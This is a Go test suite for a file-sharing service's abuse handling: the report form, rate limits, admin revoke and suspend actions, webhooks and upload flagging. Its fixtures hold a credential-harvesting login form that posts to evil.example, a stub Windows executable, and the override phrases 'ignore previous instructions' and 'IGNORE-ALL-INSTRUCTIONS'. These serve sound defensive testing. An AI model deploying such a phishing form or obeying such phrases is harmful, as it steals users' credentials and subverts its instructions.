package app

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/mrRedSun/redrop/pkg/api"
	"github.com/mrRedSun/redrop/pkg/client"
)

// Abuse handling (DESIGN.md "Abuse handling"): the report form's endpoint,
// its limits and caps, the admin queue and its audit, suspension, the
// webhook, upload flags, security.txt and the report links.

const appOrigin = "http://app.test"

// report files a report from network (an X-Forwarded-For address: the test
// server's peer is a trusted proxy) as the report page would send it.
func (h *harness) report(network string, req api.ReportRequest, header ...string) *http.Response {
	h.t.Helper()
	b, _ := json.Marshal(req)
	return h.raw("POST", "/api/v1/reports", "application/json", bytes.NewReader(b),
		append([]string{"Origin", appOrigin, "Sec-Fetch-Site", "same-origin", "X-Forwarded-For", network}, header...)...)
}

func (h *harness) reports(status string) []api.Report {
	h.t.Helper()
	r := h.do("GET", "/api/v1/admin/reports?status="+status, nil, false)
	expectStatus(h.t, r, 200, "list reports")
	return decode[api.ReportList](h.t, r).Items
}

func phishing(link string) api.ReportRequest {
	return api.ReportRequest{URL: link, Category: "phishing", Details: "Asks for a bank password", Contact: "sam@example.org"}
}

func TestReportFormChecks(t *testing.T) {
	h := newHarness(t)
	c := client.New(h.srv.URL, h.setupAdmin())
	a := h.share(c, "page", client.PublishOptions{})
	ok := phishing(a.URL + "page.html?x=1#frag")

	// Same origin only: the CSRF header, an exact Origin, Fetch Metadata.
	b, _ := json.Marshal(ok)
	expectStatus(t, h.raw("POST", "/api/v1/reports", "application/json", bytes.NewReader(b), "X-Forwarded-For", "192.0.2.1"), 403, "no Origin")
	expectStatus(t, h.report("192.0.2.1", ok, "Origin", "https://evil.example"), 403, "another origin")
	expectStatus(t, h.report("192.0.2.1", ok, "Origin", "http://content.test"), 403, "the content domain")
	expectStatus(t, h.report("192.0.2.1", ok, "Sec-Fetch-Site", "cross-site"), 403, "cross-site")
	req, _ := http.NewRequest("POST", h.srv.URL+"/api/v1/reports", bytes.NewReader(b))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Origin", appOrigin)
	resp, err := h.srv.Client().Do(req)
	if err != nil {
		t.Fatal(err)
	}
	resp.Body.Close()
	expectStatus(t, resp, 403, "no CSRF header")
	// Bodies: JSON only, 8 KiB.
	expectStatus(t, h.raw("POST", "/api/v1/reports", "application/x-www-form-urlencoded", strings.NewReader("url=x"), "Origin", appOrigin, "X-Forwarded-For", "192.0.2.1"), 415, "form post")
	big := phishing(a.URL)
	big.Details = strings.Repeat("a", 9<<10)
	expectStatus(t, h.report("192.0.2.1", big), 413, "9 KiB body")
	if n := len(h.reports("all")); n != 0 {
		t.Fatalf("%d reports stored from refused requests", n)
	}

	// Validation: syntax only.
	net := 10
	for name, bad := range map[string]api.ReportRequest{
		"another domain":   phishing("https://evil.example/"),
		"the content apex": phishing("http://content.test/"),
		"a nested host":    phishing("http://a.amber-otter-quilt-river.content.test/"),
		"a bad slug":       phishing("http://not-a-slug.content.test/"),
		"credentials":      phishing("http://u:p@amber-otter-quilt-river.content.test/"),
		"no url":           phishing(""),
		"javascript":       phishing("javascript:alert(1)"),
		"a bad category":   {URL: a.URL, Category: "rude"},
		"long details":     {URL: a.URL, Category: "spam", Details: strings.Repeat("é", 2001)},
		"long contact":     {URL: a.URL, Category: "spam", Contact: strings.Repeat("c", 201)},
	} {
		net++ // spread over networks: the limit is not under test here
		r := h.report(fmt.Sprintf("192.0.2.%d", net), bad)
		if r.StatusCode != 400 {
			t.Errorf("%s: %d, want 400: %s", name, r.StatusCode, body(r))
		}
	}

	// A stored report and a dropped one answer the same.
	stored := h.report("192.0.2.100", ok)
	storedBody := body(stored)
	unknown := h.report("192.0.2.101", phishing("http://zebra-zebra-zebra-zebra.content.test/"))
	if stored.StatusCode != 202 || unknown.StatusCode != 202 || body(unknown) != storedBody || storedBody != `{"ok":true}`+"\n" {
		t.Fatalf("stored %d %q, unknown link %d", stored.StatusCode, storedBody, unknown.StatusCode)
	}
	list := h.reports("")
	if len(list) != 1 {
		t.Fatalf("%d open reports, want 1", len(list))
	}
	got := list[0]
	if got.Source != "visitor" || got.Category != "phishing" || got.ReportedURL != a.URL+"page.html?x=1" || got.Details != ok.Details || got.Contact != ok.Contact ||
		got.ArtifactID != a.ID || got.Artifact == nil || got.Artifact.URL != "" || got.OwnerUsername != "admin" || got.Status != "open" {
		t.Fatalf("stored report: %+v", got)
	}
}

func TestReportLimitsAndCaps(t *testing.T) {
	t.Setenv("REDROP_REPORTS_PER_HOUR", "3")
	t.Setenv("REDROP_REPORTS_MAX_OPEN_PER_ARTIFACT", "2")
	t.Setenv("REDROP_REPORTS_MAX_OPEN", "4")
	t.Setenv("REDROP_ABUSE_CONTACT", "abuse@example.com")
	h := newHarness(t)
	c := client.New(h.srv.URL, h.setupAdmin())
	a := h.share(c, "a", client.PublishOptions{})
	b := h.share(c, "b", client.PublishOptions{})
	d := h.share(c, "d", client.PublishOptions{})

	// Per network: every request counts, valid or not; then 429.
	for i := 0; i < 3; i++ {
		h.report("198.51.100.1", api.ReportRequest{URL: "x"})
	}
	r := h.report("198.51.100.1", phishing(a.URL))
	if r.StatusCode != 429 || r.Header.Get("Retry-After") == "" {
		t.Fatalf("over the hourly limit: %d, Retry-After %q", r.StatusCode, r.Header.Get("Retry-After"))
	}
	// IPv6 networks are /64s.
	for _, addr := range []string{"2001:db8::1", "2001:db8::2", "2001:db8::3"} {
		expectStatus(t, h.report(addr, api.ReportRequest{URL: "x"}), 400, "IPv6 report from "+addr)
	}
	expectStatus(t, h.report("2001:db8::4", phishing(a.URL)), 429, "the same /64")

	// A duplicate from the same network counts once.
	expectStatus(t, h.report("198.51.100.2", phishing(a.URL)), 202, "first")
	expectStatus(t, h.report("198.51.100.2", phishing(a.URL)), 202, "duplicate")
	if n := len(h.reports("")); n != 1 {
		t.Fatalf("duplicate stored: %d reports", n)
	}
	// Per artifact: two open reports, the third is dropped.
	expectStatus(t, h.report("198.51.100.3", phishing(a.URL)), 202, "second on a")
	expectStatus(t, h.report("198.51.100.4", phishing(a.URL)), 202, "third on a, dropped")
	if n := len(h.reports("")); n != 2 {
		t.Fatalf("per-artifact cap: %d reports", n)
	}
	// Globally: four open reports, then every report is refused, whatever
	// the URL names.
	expectStatus(t, h.report("198.51.100.5", phishing(b.URL)), 202, "b")
	expectStatus(t, h.report("198.51.100.6", phishing(b.URL)), 202, "b again")
	full := h.report("198.51.100.7", phishing(d.URL))
	fullBody := body(full)
	unknown := h.report("198.51.100.8", phishing("http://zebra-zebra-zebra-zebra.content.test/"))
	if full.StatusCode != 429 || unknown.StatusCode != 429 || body(unknown) != fullBody || !strings.Contains(fullBody, "abuse@example.com") {
		t.Fatalf("queue full: %d %s / unknown link %d", full.StatusCode, fullBody, unknown.StatusCode)
	}
	// Closing a report frees room.
	id := h.reports("")[0].ID
	expectStatus(t, h.do("PATCH", "/api/v1/admin/reports/"+id, api.ReportStatusUpdate{Status: "dismissed"}, true), 200, "dismiss")
	expectStatus(t, h.report("198.51.100.9", phishing(d.URL)), 202, "after a dismissal")
	if n := len(h.reports("")); n != 4 {
		t.Fatalf("after dismissing one: %d open", n)
	}
}

func historyActions(r api.Report) []string {
	var out []string
	for _, e := range r.History {
		out = append(out, e.Actor+" "+e.Action)
	}
	return out
}

func TestReportQueueActions(t *testing.T) {
	h := newHarness(t)
	admin := client.New(h.srv.URL, h.setupAdmin())
	bobUser := h.inviteUser("bob")
	bobToken := h.tokenFor(bobUser)
	bob := client.New(h.srv.URL, bobToken)
	ctx := context.Background()
	a1 := h.share(bob, "one", client.PublishOptions{})
	a2 := h.share(bob, "two", client.PublishOptions{})
	mine := h.share(admin, "admin's", client.PublishOptions{})
	expectStatus(t, h.report("192.0.2.1", phishing(a1.URL)), 202, "report a1")
	expectStatus(t, h.report("192.0.2.2", api.ReportRequest{URL: a1.URL, Category: "spam"}), 202, "report a1 again")

	// Only administrators reach the queue.
	adminSession := h.session
	h.session = bobUser.session
	expectStatus(t, h.do("GET", "/api/v1/admin/reports", nil, false), 403, "bob lists reports")
	h.session = adminSession
	req, _ := http.NewRequest("GET", h.srv.URL+"/api/v1/admin/reports", nil)
	req.Header.Set("Authorization", "Bearer "+bobToken)
	if resp, err := h.srv.Client().Do(req); err != nil || resp.StatusCode != 403 {
		t.Fatalf("token lists reports: %v %v", resp.StatusCode, err)
	} else {
		resp.Body.Close()
	}

	list := h.reports("")
	if len(list) != 2 {
		t.Fatalf("%d reports", len(list))
	}
	first := list[1] // newest first
	// Dismiss and reopen, audited.
	r := h.do("PATCH", "/api/v1/admin/reports/"+first.ID, api.ReportStatusUpdate{Status: "dismissed"}, true)
	expectStatus(t, r, 200, "dismiss")
	if got := decode[api.Report](t, r); got.Status != "dismissed" || got.ClosedBy != "admin" || got.ClosedAt == nil {
		t.Fatalf("dismissed: %+v", got)
	}
	r = h.do("PATCH", "/api/v1/admin/reports/"+first.ID, api.ReportStatusUpdate{Status: "open"}, true)
	if got := decode[api.Report](t, r); got.Status != "open" || got.ClosedAt != nil || strings.Join(historyActions(got), ",") != "admin report.dismissed,admin report.open" {
		t.Fatalf("reopened: %+v", got)
	}
	expectStatus(t, h.do("PATCH", "/api/v1/admin/reports/"+first.ID, api.ReportStatusUpdate{Status: "gone"}, true), 400, "bad status")
	expectStatus(t, h.do("PATCH", "/api/v1/admin/reports/nope", api.ReportStatusUpdate{Status: "resolved"}, true), 404, "unknown report")
	expectStatus(t, h.do("POST", "/api/v1/admin/reports/"+first.ID+"/revoke", nil, false), 403, "revoke without the CSRF header")

	// Revoke: the administrator's revocation, every open report on it resolved.
	expectStatus(t, h.get(hostOf(t, a1.URL), nil), 200, "a1 before")
	r = h.do("POST", "/api/v1/admin/reports/"+first.ID+"/revoke", nil, true)
	expectStatus(t, r, 200, "revoke")
	got := decode[api.Report](t, r)
	if got.Status != "resolved" || got.Artifact == nil || !got.Artifact.RevokedByAdmin || got.Artifact.Status != api.StatusRevoked ||
		len(got.History) != 3 || got.History[2].Action != "artifact.revoke" || got.History[2].Detail != "revoked the artifact, resolved 2 reports" {
		t.Fatalf("revoked: %+v", got)
	}
	if open := h.reports(""); len(open) != 0 {
		t.Fatalf("open after revoke: %+v", open)
	}
	expectStatus(t, h.get(hostOf(t, a1.URL), nil), 404, "a1 after the revoke")
	restore := false
	if _, err := bob.UpdateArtifact(ctx, a1.ID, &api.UpdateArtifactRequest{Revoked: &restore}); client.StatusOf(err) != 403 {
		t.Fatalf("owner undoes the revoke: %v", err)
	}

	// Suspend: an administrator account is refused.
	expectStatus(t, h.report("192.0.2.3", phishing(mine.URL)), 202, "report admin's")
	expectStatus(t, h.report("192.0.2.4", phishing(a2.URL)), 202, "report a2")
	var mineReport, a2Report api.Report
	for _, rep := range h.reports("") {
		if rep.ArtifactID == mine.ID {
			mineReport = rep
		} else {
			a2Report = rep
		}
	}
	expectStatus(t, h.do("POST", "/api/v1/admin/reports/"+mineReport.ID+"/suspend", nil, true), 409, "suspend an administrator")
	if _, err := admin.Me(ctx); err != nil {
		t.Fatalf("admin after a refused suspension: %v", err)
	}

	// Suspend bob: no sessions, no tokens, every artifact revoked.
	expectStatus(t, h.get(hostOf(t, a2.URL), nil), 200, "a2 before")
	r = h.do("POST", "/api/v1/admin/reports/"+a2Report.ID+"/suspend", nil, true)
	expectStatus(t, r, 200, "suspend")
	got = decode[api.Report](t, r)
	if !got.OwnerSuspended || got.Status != "resolved" || len(got.History) != 1 || got.History[0].Action != "user.suspend" ||
		got.History[0].Detail != "suspended the owner, revoked 2 artifacts, resolved 1 report" {
		t.Fatalf("suspended: %+v", got)
	}
	expectStatus(t, h.get(hostOf(t, a2.URL), nil), 404, "a2 after the suspension")
	if _, err := bob.Me(ctx); client.StatusOf(err) != 401 {
		t.Fatalf("suspended token: %v", err)
	}
	h.session = bobUser.session
	expectStatus(t, h.do("GET", "/api/v1/me", nil, false), 401, "suspended session")
	h.session = adminSession
	lr := h.raw("POST", "/api/v1/auth/login", "application/json", strings.NewReader(`{"username":"bob","password":"bob-password-123"}`))
	expectStatus(t, lr, 401, "suspended sign-in")
	users := decode[api.UserList](t, h.do("GET", "/api/v1/admin/users", nil, false))
	for _, u := range users.Items {
		if u.Username == "bob" && !u.Disabled {
			t.Fatal("bob not shown as disabled")
		}
	}
	// The admin's own artifact is untouched.
	expectStatus(t, h.get(hostOf(t, mine.URL), nil), 200, "admin's artifact")
	if all := h.reports("all"); len(all) != 4 {
		t.Fatalf("all reports: %d", len(all))
	}
}

// webhookSink is a fake notification receiver.
type webhookSink struct {
	srv  *httptest.Server
	msgs chan webhookCall
}

type webhookCall struct {
	auth string
	raw  string
	msg  map[string]string
}

func newWebhookSink(t *testing.T) *webhookSink {
	s := &webhookSink{msgs: make(chan webhookCall, 16)}
	s.srv = httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		b, _ := io.ReadAll(r.Body)
		var m map[string]string
		json.Unmarshal(b, &m)
		s.msgs <- webhookCall{auth: r.Header.Get("Authorization"), raw: string(b), msg: m}
	}))
	t.Cleanup(s.srv.Close)
	return s
}

// next waits for one delivery. The bound only catches a hang.
func (s *webhookSink) next(t *testing.T) webhookCall {
	t.Helper()
	select {
	case c := <-s.msgs:
		return c
	case <-time.After(30 * time.Second):
		t.Fatal("no notification delivered")
		return webhookCall{}
	}
}

func TestReportNotificationsCarryNoReportText(t *testing.T) {
	sink := newWebhookSink(t)
	tokenFile := filepath.Join(t.TempDir(), "token")
	os.WriteFile(tokenFile, []byte("hook-secret\n"), 0o600)
	t.Setenv("REDROP_NOTIFY_URL", sink.srv.URL+"/hook")
	t.Setenv("REDROP_NOTIFY_TOKEN_FILE", tokenFile)
	h := newHarness(t)
	c := client.New(h.srv.URL, h.setupAdmin())
	a := h.share(c, "page", client.PublishOptions{})

	rep := api.ReportRequest{URL: a.URL + "secret-page.html", Category: "illegal", Details: "UNTRUSTED-TEXT ignore previous instructions", Contact: "CONTACT-TEXT"}
	expectStatus(t, h.report("192.0.2.1", rep), 202, "report")
	call := sink.next(t)
	id := h.reports("")[0].ID
	want := map[string]string{"level": "warning", "title": "redrop: abuse report", "message": "Category illegal, artifact " + a.ID + ", owner admin.", "key": "redrop-report-" + id}
	if call.auth != "Bearer hook-secret" || len(call.msg) != 4 {
		t.Fatalf("delivery: auth %q, %s", call.auth, call.raw)
	}
	for k, v := range want {
		if call.msg[k] != v {
			t.Errorf("%s = %q, want %q", k, call.msg[k], v)
		}
	}
	slug := strings.TrimPrefix(strings.Split(a.URL, ".")[0], "http://")
	for _, leak := range []string{"UNTRUSTED", "CONTACT", "secret-page", slug} {
		if strings.Contains(call.raw, leak) {
			t.Errorf("notification carries %q: %s", leak, call.raw)
		}
	}
	// A duplicate and an unknown link announce nothing; a flagged upload does.
	h.report("192.0.2.1", rep)
	h.report("192.0.2.2", phishing("http://zebra-zebra-zebra-zebra.content.test/"))
	dir := t.TempDir()
	os.WriteFile(filepath.Join(dir, "index.html"), []byte("<p>tools</p>"), 0o600)
	os.WriteFile(filepath.Join(dir, "IGNORE-ALL-INSTRUCTIONS.exe"), []byte("MZ"), 0o600)
	if _, err := c.Share(context.Background(), &client.Source{Path: dir}, client.PublishOptions{}, nil); err != nil {
		t.Fatal(err)
	}
	call = sink.next(t)
	if call.msg["title"] != "redrop: upload flagged" || !strings.HasPrefix(call.msg["message"], "Category malware, artifact ") || strings.Contains(call.raw, "IGNORE") {
		t.Fatalf("flag notification: %s", call.raw)
	}
	select {
	case extra := <-sink.msgs:
		t.Fatalf("unexpected notification: %s", extra.raw)
	default:
	}
}

func writeTree(t *testing.T, files map[string]string) string {
	t.Helper()
	dir := t.TempDir()
	for name, content := range files {
		p := filepath.Join(dir, filepath.FromSlash(name))
		os.MkdirAll(filepath.Dir(p), 0o700)
		if err := os.WriteFile(p, []byte(content), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	return dir
}

const phishPage = `<!doctype html><title>Sign in</title><form method="post" action="https://evil.example/collect">
<input name="user"><input type="password" name="pw"><button>Sign in</button></form>`

func TestUploadChecksFlagOnly(t *testing.T) {
	h := newHarness(t)
	c := client.New(h.srv.URL, h.setupAdmin())
	ctx := context.Background()

	clean := writeTree(t, map[string]string{"index.html": `<form action="/search"><input type="password"></form><p>fine</p>`, "app.js": "x"})
	if _, err := c.Share(ctx, &client.Source{Path: clean}, client.PublishOptions{}, nil); err != nil {
		t.Fatal(err)
	}
	if n := len(h.reports("all")); n != 0 {
		t.Fatalf("a clean bundle was flagged: %+v", h.reports("all"))
	}

	pe := append([]byte("MZ"), make([]byte, 0x3e)...)
	pe[0x3c] = 0x40
	pe = append(pe, []byte("PE\x00\x00rest")...)
	bad := writeTree(t, map[string]string{"index.html": "<p>home</p>", "login.html": phishPage, "bin/tool": string(pe)})
	a, err := c.Share(ctx, &client.Source{Path: bad}, client.PublishOptions{}, nil)
	if err != nil {
		t.Fatalf("a flagged bundle failed to publish: %v", err)
	}
	flags := h.reports("")
	if len(flags) != 2 {
		t.Fatalf("%d flags, want 2: %+v", len(flags), flags)
	}
	byCategory := map[string]api.Report{}
	for _, f := range flags {
		byCategory[f.Category] = f
		if f.Source != "system" || f.ArtifactID != a.ID || f.Version != 1 || f.ReportedURL != "" || f.Artifact == nil || f.Artifact.URL != "" {
			t.Errorf("flag: %+v", f)
		}
	}
	if d := byCategory["phishing"].Details; d != "login.html: a password form posts to evil.example" {
		t.Errorf("form finding: %q", d)
	}
	if d := byCategory["malware"].Details; d != "bin/tool: Windows executable (PE)" {
		t.Errorf("executable finding: %q", d)
	}
	// The content is served unchanged.
	host := hostOf(t, a.URL)
	req, _ := http.NewRequest("GET", h.srv.URL+"/login.html", nil)
	req.Host = host
	req.Header.Set("Sec-Fetch-Dest", "iframe")
	resp, err := h.srv.Client().Do(req)
	if err != nil {
		t.Fatal(err)
	}
	if got := body(resp); resp.StatusCode != 200 || got != phishPage {
		t.Fatalf("flagged page served as %d %q", resp.StatusCode, got)
	}
	resp.Body.Close()

	// The same findings in a new version add nothing while the flags are open.
	if _, err := c.Update(ctx, a.ID, &client.Source{Path: bad}, nil); err != nil {
		t.Fatal(err)
	}
	if n := len(h.reports("all")); n != 2 {
		t.Fatalf("repeat findings: %d reports", n)
	}
	// Once resolved, a later version with a finding is flagged again.
	expectStatus(t, h.do("PATCH", "/api/v1/admin/reports/"+byCategory["malware"].ID, api.ReportStatusUpdate{Status: "resolved"}, true), 200, "resolve")
	if _, err := c.Update(ctx, a.ID, &client.Source{Path: bad}, nil); err != nil {
		t.Fatal(err)
	}
	open := h.reports("")
	if len(open) != 2 || open[0].Category != "malware" || open[0].Version != 3 {
		t.Fatalf("after resolving: %+v", open)
	}

	// A single file that is an executable is flagged too.
	exe := shareFile(t, c, "setup.msi", "not really", client.PublishOptions{})
	found := false
	for _, f := range h.reports("") {
		found = found || (f.ArtifactID == exe.ID && f.Details == "setup.msi: Windows installer (.msi)")
	}
	if !found {
		t.Fatalf("single-file executable not flagged: %+v", h.reports(""))
	}
}

func TestSecurityTxt(t *testing.T) {
	t.Run("off", func(t *testing.T) {
		h := newHarness(t)
		expectStatus(t, h.do("GET", "/.well-known/security.txt", nil, false), 404, "app origin")
		r, _ := h.page("GET", "http://content.test/", "/.well-known/security.txt", nil)
		if r.StatusCode != 404 {
			t.Fatalf("content apex: %d", r.StatusCode)
		}
	})
	t.Run("on", func(t *testing.T) {
		t.Setenv("REDROP_ABUSE_CONTACT", "abuse@example.com")
		h := newHarness(t)
		r := h.do("GET", "/.well-known/security.txt", nil, false)
		app := body(r)
		_, apex := h.page("GET", "http://content.test/", "/.well-known/security.txt", nil)
		for origin, txt := range map[string]string{appOrigin: app, "http://content.test": apex} {
			for _, line := range []string{"Contact: mailto:abuse@example.com\n", "Contact: http://app.test/report\n", "Canonical: " + origin + "/.well-known/security.txt\n", "Preferred-Languages: en\n"} {
				if !strings.Contains(txt, line) {
					t.Errorf("%s security.txt lacks %q:\n%s", origin, line, txt)
				}
			}
			_, rest, _ := strings.Cut(txt, "Expires: ")
			exp, err := time.Parse(time.RFC3339, strings.SplitN(rest, "\n", 2)[0])
			if err != nil || !exp.After(time.Now()) || exp.After(time.Now().AddDate(1, 0, 0)) {
				t.Errorf("%s Expires: %v %v", origin, exp, err)
			}
		}
		if ct := r.Header.Get("Content-Type"); ct != "text/plain; charset=utf-8" {
			t.Errorf("Content-Type %q", ct)
		}
		// Artifact hosts never serve it.
		c := client.New(h.srv.URL, h.setupAdmin())
		a := h.share(c, "page", client.PublishOptions{})
		if r, b := h.page("GET", a.URL, "/.well-known/security.txt", nil); r.StatusCode != 404 || strings.Contains(b, "Contact:") {
			t.Fatalf("artifact host: %d", r.StatusCode)
		}
	})
}

func TestReportLinks(t *testing.T) {
	h := newHarness(t)
	c := client.New(h.srv.URL, h.setupAdmin())
	const stored = "<!doctype html><title>T</title><p>page</p>"
	open := shareFile(t, c, "p.html", stored, client.PublishOptions{})
	locked := shareFile(t, c, "q.html", stored, client.PublishOptions{Password: "letmein-please"})
	file := shareFile(t, c, "notes.txt", "notes", client.PublishOptions{})
	link := func(page string) string { return `href="http://app.test/report#url=` + url.QueryEscape(page) + `"` }

	if _, b := h.page("GET", open.URL, "/?a=1", nav); !strings.Contains(b, link(strings.TrimSuffix(open.URL, "/")+"/?a=1")) {
		t.Errorf("viewer panel lacks the report link:\n%s", b)
	}
	if _, b := h.page("GET", file.URL, "/", nav); !strings.Contains(b, link(file.URL)) {
		t.Errorf("file page lacks the report link:\n%s", b)
	}
	if _, b := h.page("GET", locked.URL, "/", nav); !strings.Contains(b, link(locked.URL)) {
		t.Errorf("gate lacks the report link:\n%s", b)
	}
	if _, b := h.page("GET", "http://content.test/", "/", nav); !strings.Contains(b, `href="http://app.test/report"`) {
		t.Errorf("apex lacks the report link:\n%s", b)
	}
	// The artifact's own bytes and the uniform miss page are unchanged.
	if _, b := h.page("GET", open.URL, "/", map[string]string{"Sec-Fetch-Dest": "iframe"}); b != stored {
		t.Errorf("artifact bytes changed: %q", b)
	}
	if _, b := h.page("GET", "http://zebra-zebra-zebra-zebra.content.test/", "/", nav); strings.Contains(b, "/report") {
		t.Errorf("miss page has a report link:\n%s", b)
	}
}
